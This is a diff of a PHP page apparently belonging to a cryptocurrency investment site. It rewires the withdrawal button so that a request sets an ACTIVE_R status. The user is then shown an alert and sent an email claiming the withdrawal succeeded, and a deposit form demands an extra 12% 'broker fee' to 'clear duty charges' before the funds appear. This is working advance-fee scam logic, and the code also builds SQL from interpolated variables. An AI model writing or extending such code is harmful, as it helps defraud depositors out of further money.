@@ -87,6 +87,8 @@ include('../frm/header.php');
 							while(	$deposite_tran_data =	$deposite_tran->result() ){
 							
 								extract($deposite_tran_data );
+
+								$t12_percent = $trant_amt * 0.12;
 								
 								$t1 = strtotime($start_tran_date);
 								$t2 = strtotime($reg_Date);
@@ -99,21 +101,48 @@ include('../frm/header.php');
 								if($duration >=7){
 								$tran_current_bal_u  = ( 7 *  $tran_daily_growth  ) - $tran_withdraw_amt;
 								}
-								if( $duration >= 1  && $tran_current_bal_u > 0 && $tran_status =='ACTIVE') {
-								$btn ="<br/> <form method='POST'>  
+								if( $duration >= 1  && $tran_current_bal_u > 0 ) {
+
+									if($tran_status =='ACTIVE'){
+										$btn ="<br/> <form method='POST'>  
 								
-									<button type='submit'  name='cash_out$tran_id' class='btn btn-sm btn-success' >Withdraw</button> 
-									<br/><input type='radio' name='coin$tran_id' required value='BTC' /> BTC <br/>
+									<input type='radio' name='coin$tran_id' required value='BTC' /> BTC <br/>
 									<input type='radio' name='coin$tran_id' required value='ETH' /> ETH <br/>
+									<button type='submit'  name='set_r$tran_id' class='btn btn-sm btn-danger' >Withdraw</button> 
 								</form>";
+
+									}elseif($tran_status =='ACTIVE_R'){
+
+										$btn ="<br/> <form method='POST' action='make_deposit1.php'>  
+								
+									<input type='hidden' name='fund_amt' required readonly value='$t12_percent' /> 
+									<input type='radio' name='coin_fund' required value='BTC' /> BTC <br/>
+									<input type='radio' name='coin_fund' required value='ETH' /> ETH <br/>
+									<button type='submit'  name='dep_btn_m' class='btn btn-sm btn-primary' >Deposit $ $t12_percent</button> <br/><span style='color:red;'>
+									An additional 12% ($ $t12_percent) broker fee<br/>
+									 must be paid to the broker to<br/>
+									  clear duty charges before these <br/>
+									  funds would reflect in your wallet.</span>
+								</form>";
+
+
+									}elseif($tran_status =='ACTIVE_C'){
+										$btn ="<br/> <form method='POST'>  
+								
+									<input type='radio' name='coin$tran_id' required value='BTC' /> BTC <br/>
+									<input type='radio' name='coin$tran_id' required value='ETH' /> ETH <br/>
+									<button type='submit'  name='cash_out$tran_id' class='btn btn-sm btn-success' >Withdraw</button> 
+								</form>";
+
+									}
+								
 								}else{
 								
 								$btn ="<br/><button  class='btn btn-sm btn-danger' disabled > <b>WITHDRAW </b> </button>";
 								}
 
-								if($tran_status =='ACTIVE'){
 									$tran_status ="In Progress";
-								}
+								
 								
 								if($duration >= 7){
 								$tran_current_bal_u  = ( 7 *  $tran_daily_growth  ) - $tran_withdraw_amt;
@@ -136,7 +165,77 @@ include('../frm/header.php');
 								
 								";
 								$no++;
+
+
+								//setting recommit
 								
+								if(isset($_POST['set_r'.$tran_id]))  {
+										$coin = addslashes(htmlentities($_POST['coin'.$tran_id]));
+    
+							$qw1RRqq = new run_query("UPDATE   `transaction`  set  tran_status='ACTIVE_R' where  tran_id ='$tran_id' ");
+							
+						
+							
+								$email_amt = $trant_amt;
+							 
+								
+
+								$site_email_send = "$site_email";		
+								$welcome_email_subject = "Withdrawal of - $ $trant_amt | $site_name - needs Broker fee ";
+								$welcome_email_headers .= "Content-type:text/html;charset=UTF-8 \r\n";
+								$welcome_email_headers .= "From: $site_name";	
+								
+								
+								 $welcome_email_body = "
+								
+									<html>
+									<head>
+										<title> Hello $user_name, </title>
+									</head>
+									<body>
+									 <b>Hello, $user_name<b> <br/> Hope we meet you well.
+									<h2> You Have Requested for the withdrwal  of $ $trant_amt  </h2>
+									Your withdrawal request of $ $trant_amt was successful and the requested funds would be deposited to your wallet. An additional 12% broker fee must be paid to the broker to clear duty charges before these funds would reflect in your wallet. <br/>
+
+
+
+									Enjoy your earnings.
+
+									
+									<hr/>
+									For enquiries, <br/>
+									Contact us on <br/>
+								
+									<b>
+									$site_email <br/>
+								
+									$site_phone <br/>
+									</b>
+									Visit us on <br/>
+								
+									$site_link <br/><br/><br/>
+								
+									Regards,  $site_name.
+									</body>
+									</html>
+								
+									";
+								
+									 mail($user_email,$welcome_email_subject,$welcome_email_body,$welcome_email_headers);
+									  
+								 echo "<script>alert('Your withdrawal request of $ $trant_amt was successful and the requested funds would be deposited to your wallet. An additional 12% broker fee must be paid to the broker to clear duty charges before these funds would reflect in your wallet');</script>"; 
+							 
+						echo "<script>window.location.replace(\"investments.php\");</script>"; 
+
+
+						 }
+						 //setting recommit ends here
+
+
+
+
+
+
 								
 									if(isset($_POST['cash_out'.$tran_id]))  {
 										$coin = addslashes(htmlentities($_POST['coin'.$tran_id]));
@@ -193,7 +292,7 @@ include('../frm/header.php');
 									  
 								 echo "<script>alert(\"TRANSACTION WITHDRAW REQUEST SUCCESSFULL!!! \");</script>"; 
 							 
-						echo "<script>window.location.replace(\"dashboard.php\");</script>"; 
+						echo "<script>window.location.replace(\"withdrawals.php\");</script>"; 
 
 
 						 }
